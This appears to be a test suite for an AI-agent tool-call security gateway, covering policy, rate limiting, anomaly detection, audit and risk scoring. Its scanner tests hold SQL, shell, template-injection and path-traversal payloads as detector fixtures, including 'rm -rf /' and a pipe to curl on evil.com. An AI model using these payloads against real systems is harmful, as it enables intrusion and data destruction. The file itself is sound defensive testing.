# t-ron test suite — covers the modules ported so far.
# Split across per-module helpers because Cyrius caps local vars
# per function; keeping main() lean keeps the compiler happy.

include "lib/string.cyr"
include "lib/fmt.cyr"
include "lib/alloc.cyr"
include "lib/vec.cyr"
include "lib/str.cyr"
include "lib/syscalls.cyr"
include "lib/io.cyr"
include "lib/tagged.cyr"
include "lib/assert.cyr"
include "lib/fnptr.cyr"
include "lib/hashmap.cyr"
include "lib/regex.cyr"
include "lib/chrono.cyr"

include "src/error.cyr"
include "src/gate.cyr"
include "src/policy.cyr"
include "src/rate.cyr"
include "src/scanner.cyr"
include "src/pattern.cyr"
include "src/audit.cyr"
include "src/score.cyr"

fn test_errors() {
    test_group("error codes");
    assert_eq(TRON_ERR_NONE,   0, "err_none=0");
    assert_eq(TRON_ERR_POLICY, 1, "err_policy=1");
    assert_eq(TRON_ERR_IO,     7, "err_io=7");
    assert_eq(streq(tron_error_label(TRON_ERR_POLICY), "policy"), 1, "label policy");
    assert_eq(streq(tron_error_label(TRON_ERR_EXPORT), "export"), 1, "label export");
    assert_eq(streq(tron_error_label(999),             "none"),   1, "label unknown");
    var e = tron_error_new(TRON_ERR_AUDIT, "chain broken");
    assert_eq(tron_error_code(e), TRON_ERR_AUDIT, "error code");
    assert_eq(streq(tron_error_msg(e), "chain broken"), 1, "error msg");
    return 0;
}

fn test_deny_codes() {
    test_group("deny codes");
    assert_eq(streq(deny_code_as_str(DENY_UNAUTHORIZED),        "unauthorized"),        1, "dc unauthorized");
    assert_eq(streq(deny_code_as_str(DENY_RATE_LIMITED),        "rate_limited"),        1, "dc rate_limited");
    assert_eq(streq(deny_code_as_str(DENY_INJECTION_DETECTED),  "injection_detected"),  1, "dc injection");
    assert_eq(streq(deny_code_as_str(DENY_TOOL_DISABLED),       "tool_disabled"),       1, "dc tool_disabled");
    assert_eq(streq(deny_code_as_str(DENY_ANOMALY_DETECTED),    "anomaly_detected"),    1, "dc anomaly");
    assert_eq(streq(deny_code_as_str(DENY_PARAMETER_TOO_LARGE), "parameter_too_large"), 1, "dc oversized");
    assert_eq(streq(deny_code_as_str(999),                      "unknown"),             1, "dc unknown");
    return 0;
}

fn test_tool_call() {
    test_group("tool call");
    var agent = str_from("web-agent");
    var tool  = str_from("tarang_probe");
    var params = str_from("{}");
    var call  = tool_call_new(agent, tool, params, 1234567890);
    assert_eq(tool_call_agent_id(call),  agent,      "tc agent");
    assert_eq(tool_call_tool_name(call), tool,       "tc tool");
    assert_eq(tool_call_params(call),    params,     "tc params");
    assert_eq(tool_call_timestamp(call), 1234567890, "tc ts");
    return 0;
}

fn test_verdicts() {
    test_group("verdict allow");
    var va = verdict_allow();
    assert_eq(verdict_kind(va),       VK_ALLOW, "allow kind");
    assert_eq(verdict_reason(va),     0,        "allow no reason");
    assert_eq(verdict_is_allowed(va), 1,        "allow allowed");
    assert_eq(verdict_is_denied(va),  0,        "allow not denied");

    test_group("verdict deny");
    var reason = str_from("unknown agent");
    var vd = verdict_deny(reason, DENY_UNAUTHORIZED);
    assert_eq(verdict_kind(vd),       VK_DENY,           "deny kind");
    assert_eq(verdict_reason(vd),     reason,            "deny reason");
    assert_eq(verdict_code(vd),       DENY_UNAUTHORIZED, "deny code");
    assert_eq(verdict_is_allowed(vd), 0,                 "deny not allowed");
    assert_eq(verdict_is_denied(vd),  1,                 "deny denied");

    test_group("verdict flag");
    var freason = str_from("anomalous pattern");
    var vf = verdict_flag(freason);
    assert_eq(verdict_kind(vf),       VK_FLAG, "flag kind");
    assert_eq(verdict_reason(vf),     freason, "flag reason");
    assert_eq(verdict_is_allowed(vf), 1,       "flag allowed (passes)");
    assert_eq(verdict_is_denied(vf),  0,       "flag not denied");

    test_group("verdict kind labels");
    assert_eq(streq(verdict_kind_as_str(VK_ALLOW), "allow"), 1, "vk allow");
    assert_eq(streq(verdict_kind_as_str(VK_DENY),  "deny"),  1, "vk deny");
    assert_eq(streq(verdict_kind_as_str(VK_FLAG),  "flag"),  1, "vk flag");
    return 0;
}

fn test_policy_core() {
    test_group("policy grant and check");
    var eng = policy_engine_new();
    policy_grant(eng, "agent-1", "tarang_*");
    var k1, r1 = policy_check(eng, "agent-1", "tarang_probe");
    assert_eq(k1, PR_ALLOW, "allow tarang_probe");
    var k2, r2 = policy_check(eng, "agent-1", "rasa_edit");
    assert_eq(k2, PR_UNKNOWN_TOOL, "unknown tool");
    var k3, r3 = policy_check(eng, "nobody", "anything");
    assert_eq(k3, PR_UNKNOWN_AGENT, "unknown agent");

    test_group("policy deny wins over allow");
    policy_grant(eng, "agent-2", "tarang_*");
    policy_revoke(eng, "agent-2", "tarang_delete");
    var k4, r4 = policy_check(eng, "agent-2", "tarang_probe");
    assert_eq(k4, PR_ALLOW, "allowed probe");
    var k5, r5 = policy_check(eng, "agent-2", "tarang_delete");
    assert_eq(k5, PR_DENY, "deny wins");

    test_group("policy glob star-all");
    policy_grant(eng, "admin", "*");
    var k6, r6 = policy_check(eng, "admin", "aegis_scan");
    assert_eq(k6, PR_ALLOW, "admin allows aegis_scan");
    return 0;
}

fn test_policy_toml() {
    test_group("policy TOML loader");
    var eng = policy_engine_new();
    var toml1 = "[agent.\"web\"]\nallow = [\"tarang_*\", \"rasa_*\"]\ndeny = [\"aegis_*\"]\n";
    policy_load_toml(eng, toml1);
    var k1, r1 = policy_check(eng, "web", "tarang_probe");
    assert_eq(k1, PR_ALLOW, "toml allow tarang");
    var k2, r2 = policy_check(eng, "web", "rasa_edit");
    assert_eq(k2, PR_ALLOW, "toml allow rasa");
    var k3, r3 = policy_check(eng, "web", "aegis_scan");
    assert_eq(k3, PR_DENY, "toml deny aegis");
    var k4, r4 = policy_check(eng, "web", "other_tool");
    assert_eq(k4, PR_UNKNOWN_TOOL, "toml unknown tool");

    test_group("policy TOML rate limit");
    var eng2 = policy_engine_new();
    var toml2 = "[agent.\"limited\"]\nallow = [\"*\"]\n[agent.\"limited\".rate_limit]\ncalls_per_minute = 10\n[agent.\"unlimited\"]\nallow = [\"*\"]\n";
    policy_load_toml(eng2, toml2);
    assert_eq(agent_policy_rate_cpm(policy_get(eng2, "limited")),   10, "rate cpm = 10");
    assert_eq(agent_policy_rate_cpm(policy_get(eng2, "unlimited")),  0, "rate cpm = 0 (unset)");

    test_group("policy TOML reload replaces");
    var eng3 = policy_engine_new();
    policy_grant(eng3, "old-agent", "tarang_*");
    policy_load_toml(eng3, "[agent.\"new-agent\"]\nallow = [\"*\"]\n");
    var k5, r5 = policy_check(eng3, "old-agent", "anything");
    assert_eq(k5, PR_UNKNOWN_AGENT, "reload drops old agent");
    var k6, r6 = policy_check(eng3, "new-agent", "anything");
    assert_eq(k6, PR_ALLOW, "reload loads new agent");

    test_group("policy deny-only");
    var eng4 = policy_engine_new();
    policy_load_toml(eng4, "[agent.\"lockdown\"]\ndeny = [\"*\"]\n");
    var k7, r7 = policy_check(eng4, "lockdown", "anything");
    assert_eq(k7, PR_DENY, "deny-only policy");
    return 0;
}

fn test_rate_basic() {
    test_group("rate limiter basic");
    var rl = rate_limiter_new();
    var allowed = 0;
    for (var i = 0; i < 60; i = i + 1) {
        if (rate_limiter_check(rl, "agent", "tool") == 1) { allowed = allowed + 1; }
    }
    assert_eq(allowed, 60, "60 calls allowed");
    assert_eq(rate_limiter_check(rl, "agent", "tool"), 0, "61st denied");

    test_group("rate limiter separate agents");
    var rl2 = rate_limiter_new();
    for (var i = 0; i < 60; i = i + 1) { rate_limiter_check(rl2, "agent-a", "tool"); }
    assert_eq(rate_limiter_check(rl2, "agent-a", "tool"), 0, "agent-a exhausted");
    assert_eq(rate_limiter_check(rl2, "agent-b", "tool"), 1, "agent-b has tokens");

    test_group("rate limiter separate tools");
    var rl3 = rate_limiter_new();
    for (var i = 0; i < 60; i = i + 1) { rate_limiter_check(rl3, "agent", "tool_a"); }
    assert_eq(rate_limiter_check(rl3, "agent", "tool_a"), 0, "tool_a exhausted");
    assert_eq(rate_limiter_check(rl3, "agent", "tool_b"), 1, "tool_b has tokens");
    return 0;
}

fn test_rate_override() {
    test_group("rate limiter set_rate lowers");
    var rl = rate_limiter_new();
    rate_limiter_check(rl, "agent", "tool");
    rate_limiter_set_rate(rl, "agent", 10);
    var after = 0;
    for (var i = 0; i < 20; i = i + 1) {
        if (rate_limiter_check(rl, "agent", "tool") == 1) { after = after + 1; }
        else { break; }
    }
    assert_eq(after, 10, "lowered to 10");

    test_group("rate limiter set_rate before check");
    var rl2 = rate_limiter_new();
    rate_limiter_set_rate(rl2, "nobody", 5);
    var cnt = 0;
    for (var i = 0; i < 10; i = i + 1) {
        if (rate_limiter_check(rl2, "nobody", "tool") == 1) { cnt = cnt + 1; }
    }
    assert_eq(cnt, 5, "override applies to new buckets");

    test_group("rate limiter set_rate doesnt cross agents");
    var rl3 = rate_limiter_new();
    rate_limiter_check(rl3, "agent-a", "tool");
    rate_limiter_check(rl3, "agent-b", "tool");
    rate_limiter_set_rate(rl3, "agent-a", 5);
    var bcount = 0;
    for (var i = 0; i < 59; i = i + 1) {
        if (rate_limiter_check(rl3, "agent-b", "tool") == 1) { bcount = bcount + 1; }
    }
    assert_eq(bcount, 59, "agent-b keeps default rate");
    return 0;
}

fn test_scanner_sql() {
    test_group("scanner sql");
    var s1 = "SELECT * FROM users WHERE id=1 UNION SELECT * FROM passwords";
    assert_eq((scanner_scan_text(s1, strlen(s1)) != 0), 1, "sql union/select/from");
    var s2 = "1 UNION SELECT * FROM passwords";
    assert_eq((scanner_scan_text(s2, strlen(s2)) != 0), 1, "sql short union");
    var s3 = "1; DROP TABLE users";
    assert_eq((scanner_scan_text(s3, strlen(s3)) != 0), 1, "sql ; drop table");
    var s4 = "id = 1 -- comment";
    assert_eq((scanner_scan_text(s4, strlen(s4)) != 0), 1, "sql -- comment");
    return 0;
}

fn test_scanner_shell() {
    test_group("scanner shell");
    var s1 = "hello; rm -rf /";
    assert_eq((scanner_scan_text(s1, strlen(s1)) != 0), 1, "shell ; rm");
    var s2 = "data| curl http://evil.com";
    assert_eq((scanner_scan_text(s2, strlen(s2)) != 0), 1, "shell | curl");
    var s3 = "file`rm /tmp/data`";
    assert_eq((scanner_scan_text(s3, strlen(s3)) != 0), 1, "shell backtick rm");
    return 0;
}

fn test_scanner_template() {
    test_group("scanner template");
    var s1 = "{{config.items()}}";
    assert_eq((scanner_scan_text(s1, strlen(s1)) != 0), 1, "tpl config");
    var s2 = "{{self.__class__.__mro__}}";
    assert_eq((scanner_scan_text(s2, strlen(s2)) != 0), 1, "tpl self __");
    var s3 = "<%= system('id') %>";
    assert_eq((scanner_scan_text(s3, strlen(s3)) != 0), 1, "tpl erb");
    var s4 = "Hello ${username}, welcome!";
    assert_eq((scanner_scan_text(s4, strlen(s4)) != 0), 0, "tpl benign ${var}");
    return 0;
}

fn test_scanner_path() {
    test_group("scanner path traversal");
    var p1 = "../../../etc/passwd";
    assert_eq((scanner_scan_text(p1, strlen(p1)) != 0), 1, "path ../");
    var p2 = "..\\..\\windows\\system32";
    assert_eq((scanner_scan_text(p2, strlen(p2)) != 0), 1, "path ..\\");
    var p3 = "%2e%2e/etc/passwd";
    assert_eq((scanner_scan_text(p3, strlen(p3)) != 0), 1, "path %2e%2e lowercase");
    var p4 = "%2E%2E/etc/shadow";
    assert_eq((scanner_scan_text(p4, strlen(p4)) != 0), 1, "path %2E%2E uppercase");
    return 0;
}

fn test_scanner_clean() {
    test_group("scanner clean");
    var c1 = "hello world";
    assert_eq(scanner_scan_text(c1, strlen(c1)), 0, "clean string");
    var c2 = "user_id_42";
    assert_eq(scanner_scan_text(c2, strlen(c2)), 0, "clean identifier");
    return 0;
}

fn test_scanner_json() {
    test_group("scanner json walker");
    var j1 = "{\"name\": \"hello world\", \"count\": 42}";
    assert_eq(scanner_scan(j1), 0, "clean json");
    var j2 = "{\"q\": \"SELECT * FROM users WHERE 1=1 UNION SELECT * FROM passwords\"}";
    assert_eq((scanner_scan(j2) != 0), 1, "nested sql");
    var j3 = "{\"cmd\": \"hello; rm -rf /\"}";
    assert_eq((scanner_scan(j3) != 0), 1, "nested shell");
    var j4 = "{\"outer\": {\"inner\": {\"deep\": \"hello; rm -rf /\"}}}";
    assert_eq((scanner_scan(j4) != 0), 1, "deeply nested shell");
    var j5 = "{\"items\": [\"safe\", \"also safe\", \"SELECT * FROM users WHERE 1=1 UNION SELECT * FROM passwords\"]}";
    assert_eq((scanner_scan(j5) != 0), 1, "in array");
    var j6 = "{}";
    assert_eq(scanner_scan(j6), 0, "empty object");
    var j7 = "{\"count\": 42, \"active\": true, \"scores\": [1,2,3]}";
    assert_eq(scanner_scan(j7), 0, "non-string values");
    return 0;
}

#  Build a ToolCall fixture whose timestamp is `hour:00:00 UTC on 2026-04-01`.
fn _mk_call(agent, tool, hour) {
    var base = 1775001600;                #  2026-04-01 00:00:00 UTC
    var ts_ns = (base + hour * 3600) * 1000000000;
    return tool_call_new(agent, tool, str_from("{}"), ts_ns);
}

fn test_pattern_normal() {
    test_group("pattern no anomaly normal usage");
    var pa = pattern_analyzer_new();
    for (var i = 0; i < 10; i = i + 1) {
        pattern_record(pa, _mk_call("agent-1", "tarang_probe", 10));
    }
    assert_eq(pattern_check_anomaly(pa, "agent-1", 10), 0, "no anomaly");
    assert_eq(pattern_check_anomaly(pa, "nobody",   10), 0, "unknown agent clean");
    return 0;
}

fn test_pattern_enumeration() {
    test_group("pattern tool enumeration");
    var pa = pattern_analyzer_new();
    for (var i = 0; i < 20; i = i + 1) {
        var name = alloc(16);
        memcpy(name, "tool_", 5);
        var len = fmt_int_buf(i, name + 5);
        store8(name + 5 + len, 0);
        pattern_record(pa, _mk_call("agent-1", name, 10));
    }
    var msg = pattern_check_anomaly(pa, "agent-1", 10);
    assert_eq((msg != 0), 1, "enumeration flagged");

    test_group("pattern enumeration boundary");
    var pa2 = pattern_analyzer_new();
    for (var i = 0; i < 14; i = i + 1) {
        var name = alloc(16);
        memcpy(name, "tool_", 5);
        var len = fmt_int_buf(i, name + 5);
        store8(name + 5 + len, 0);
        pattern_record(pa2, _mk_call("agent-1", name, 10));
    }
    for (var i = 0; i < 6; i = i + 1) {
        pattern_record(pa2, _mk_call("agent-1", "tool_0", 10));
    }
    assert_eq(pattern_check_anomaly(pa2, "agent-1", 10), 0, "14 distinct not flagged");
    return 0;
}

fn test_pattern_escalation() {
    test_group("pattern privilege escalation");
    var pa = pattern_analyzer_new();
    pattern_record(pa, _mk_call("agent-1", "tarang_probe",     10));
    pattern_record(pa, _mk_call("agent-1", "rasa_edit",        10));
    pattern_record(pa, _mk_call("agent-1", "aegis_scan",       10));
    pattern_record(pa, _mk_call("agent-1", "phylax_alert",     10));
    pattern_record(pa, _mk_call("agent-1", "aegis_quarantine", 10));
    var msg = pattern_check_anomaly(pa, "agent-1", 10);
    assert_eq((msg != 0), 1, "escalation flagged");

    test_group("pattern pure sensitive no escalation");
    var pa2 = pattern_analyzer_new();
    pattern_record(pa2, _mk_call("admin", "aegis_scan",        10));
    pattern_record(pa2, _mk_call("admin", "aegis_quarantine",  10));
    pattern_record(pa2, _mk_call("admin", "phylax_alert",      10));
    pattern_record(pa2, _mk_call("admin", "aegis_report",      10));
    pattern_record(pa2, _mk_call("admin", "phylax_sweep",      10));
    assert_eq(pattern_check_anomaly(pa2, "admin", 10), 0, "all-sensitive no flag");
    return 0;
}

fn test_pattern_ring_buffer() {
    test_group("pattern ring buffer overflow");
    var pa = pattern_analyzer_new();
    for (var i = 0; i < 110; i = i + 1) {
        pattern_record(pa, _mk_call("agent-1", "tarang_probe", 10));
    }
    var hist = map_get(pattern_history(pa), "agent-1");
    assert_eq(vec_len(hist), PAT_MAX_HISTORY, "history capped at 100");
    return 0;
}

fn test_pattern_time_anomaly() {
    test_group("pattern time anomaly insufficient history");
    var pa = pattern_analyzer_new();
    for (var i = 0; i < 10; i = i + 1) {
        pattern_record(pa, _mk_call("new-agent", "tarang_probe", 10));
    }
    assert_eq(pattern_check_anomaly(pa, "new-agent", 3), 0, "no flag below 50 calls");

    test_group("pattern time anomaly within pattern");
    var pa2 = pattern_analyzer_new();
    for (var i = 0; i < 60; i = i + 1) {
        pattern_record(pa2, _mk_call("agent-1", "tarang_probe", 10));
    }
    assert_eq(pattern_check_anomaly(pa2, "agent-1", 10), 0, "no flag in pattern hour");

    test_group("pattern time anomaly off hours");
    var pa3 = pattern_analyzer_new();
    for (var h = 9; h < 17; h = h + 1) {
        for (var i = 0; i < 8; i = i + 1) {
            pattern_record(pa3, _mk_call("agent-1", "tarang_probe", h));
        }
    }
    var msg = pattern_check_anomaly(pa3, "agent-1", 3);
    assert_eq((msg != 0), 1, "hour 3 flagged as off-hours");
    return 0;
}

fn test_pattern_isolation() {
    test_group("pattern separate agent histories");
    var pa = pattern_analyzer_new();
    for (var i = 0; i < 20; i = i + 1) {
        var name = alloc(16);
        memcpy(name, "tool_", 5);
        var len = fmt_int_buf(i, name + 5);
        store8(name + 5 + len, 0);
        pattern_record(pa, _mk_call("agent-a", name, 10));
    }
    pattern_record(pa, _mk_call("agent-b", "tarang_probe", 10));
    var msg_a = pattern_check_anomaly(pa, "agent-a", 10);
    assert_eq((msg_a != 0), 1, "agent-a flagged");
    assert_eq(pattern_check_anomaly(pa, "agent-b", 10), 0, "agent-b clean");
    return 0;
}

fn _mk_deny() {
    return verdict_deny("nope", DENY_UNAUTHORIZED);
}

fn _mk_flag() {
    return verdict_flag("sus");
}

fn _mk_audit_call(agent, tool) {
    return tool_call_new(agent, tool, str_from("{}"), 0);
}

fn test_audit_log_and_query() {
    test_group("audit log and retrieve");
    var a = audit_logger_new();
    var c = _mk_audit_call("agent-1", "test_tool");
    audit_log(a, c, verdict_allow());
    audit_log(a, c, _mk_deny());
    assert_eq(audit_total_count(a), 2, "total = 2");
    assert_eq(audit_deny_count(a),  1, "denies = 1");
    var recent = audit_recent(a, 10);
    assert_eq(vec_len(recent), 2, "recent has 2");
    assert_eq(security_event_kind(vec_get(recent, 0)), VK_DENY, "most recent is deny");
    return 0;
}

fn test_audit_flag_verdict() {
    test_group("audit flag verdict");
    var a = audit_logger_new();
    audit_log(a, _mk_audit_call("agent-1", "test_tool"), _mk_flag());
    var events = audit_recent(a, 1);
    assert_eq(security_event_kind(vec_get(events, 0)),  VK_FLAG,        "flag recorded");
    assert_eq(streq(security_event_reason(vec_get(events, 0)), "sus"), 1, "flag reason");
    assert_eq(audit_deny_count(a), 0, "flags not counted as denies");
    return 0;
}

fn test_audit_agent_filter() {
    test_group("audit agent event filtering");
    var a  = audit_logger_new();
    var ca = _mk_audit_call("agent-a", "tool");
    var cb = _mk_audit_call("agent-b", "tool");
    for (var i = 0; i < 5; i = i + 1) { audit_log(a, ca, verdict_allow()); }
    for (var i = 0; i < 3; i = i + 1) { audit_log(a, cb, verdict_allow()); }
    assert_eq(vec_len(audit_agent_events(a, "agent-a", 100)), 5, "agent-a = 5");
    assert_eq(vec_len(audit_agent_events(a, "agent-b", 100)), 3, "agent-b = 3");
    assert_eq(vec_len(audit_agent_events(a, "nobody",   100)), 0, "nobody = 0");
    assert_eq(vec_len(audit_agent_events(a, "agent-a", 3)),    3, "limit = 3");
    return 0;
}

fn test_audit_empty() {
    test_group("audit empty state");
    var a = audit_logger_new();
    assert_eq(audit_total_count(a),               0, "empty total");
    assert_eq(audit_deny_count(a),                0, "empty denies");
    assert_eq(vec_len(audit_recent(a, 10)),       0, "empty recent");
    assert_eq(vec_len(audit_agent_events(a, "x", 10)), 0, "empty agent events");
    return 0;
}

fn test_audit_unique_id() {
    test_group("audit unique event ids");
    var a = audit_logger_new();
    var c = _mk_audit_call("agent-1", "tool");
    audit_log(a, c, verdict_allow());
    audit_log(a, c, verdict_allow());
    var r = audit_recent(a, 2);
    var id_a = security_event_id(vec_get(r, 0));
    var id_b = security_event_id(vec_get(r, 1));
    assert_eq((id_a != id_b), 1, "ids differ");
    return 0;
}

fn test_risk_clean() {
    test_group("risk score clean agent");
    var a = audit_logger_new();
    var c = _mk_audit_call("good-agent", "tool");
    for (var i = 0; i < 10; i = i + 1) { audit_log(a, c, verdict_allow()); }
    assert_eq(risk_score(a, "good-agent"), 0, "0 risk for all allows");
    return 0;
}

fn test_risk_max() {
    test_group("risk score all denied");
    var a = audit_logger_new();
    var c = _mk_audit_call("bad-agent", "tool");
    for (var i = 0; i < 10; i = i + 1) { audit_log(a, c, _mk_deny()); }
    assert_eq(risk_score(a, "bad-agent"), SCORE_SCALE, "1000 = max risk");
    return 0;
}

fn test_risk_unknown() {
    test_group("risk score unknown agent");
    var a = audit_logger_new();
    assert_eq(risk_score(a, "nobody"), 0, "unknown = 0");
    return 0;
}

fn test_risk_flags_half() {
    test_group("risk score flags only");
    var a = audit_logger_new();
    var c = _mk_audit_call("flagged", "tool");
    for (var i = 0; i < 10; i = i + 1) { audit_log(a, c, _mk_flag()); }
    #  10 flags, 0 denies, total=10: (0*2 + 10)/(10*2) = 0.5 -> 500
    assert_eq(risk_score(a, "flagged"), 500, "flags-only = 500");
    return 0;
}

fn test_risk_mixed() {
    test_group("risk score mixed verdicts");
    var a = audit_logger_new();
    var c = _mk_audit_call("mixed", "tool");
    for (var i = 0; i < 5; i = i + 1) { audit_log(a, c, verdict_allow()); }
    for (var i = 0; i < 3; i = i + 1) { audit_log(a, c, _mk_deny()); }
    for (var i = 0; i < 2; i = i + 1) { audit_log(a, c, _mk_flag()); }
    #  (3*2 + 2) / (10*2) = 8/20 = 0.4 -> 400
    assert_eq(risk_score(a, "mixed"), 400, "mixed = 400");
    return 0;
}

fn main() {
    alloc_init();
    test_errors();
    test_deny_codes();
    test_tool_call();
    test_verdicts();
    test_policy_core();
    test_policy_toml();
    test_rate_basic();
    test_rate_override();
    test_scanner_sql();
    test_scanner_shell();
    test_scanner_template();
    test_scanner_path();
    test_scanner_clean();
    test_scanner_json();
    test_pattern_normal();
    test_pattern_enumeration();
    test_pattern_escalation();
    test_pattern_ring_buffer();
    test_pattern_time_anomaly();
    test_pattern_isolation();
    test_audit_log_and_query();
    test_audit_flag_verdict();
    test_audit_agent_filter();
    test_audit_empty();
    test_audit_unique_id();
    test_risk_clean();
    test_risk_max();
    test_risk_unknown();
    test_risk_flags_half();
    test_risk_mixed();
    return assert_summary();
}

var exit_code = main();
syscall(60, exit_code);
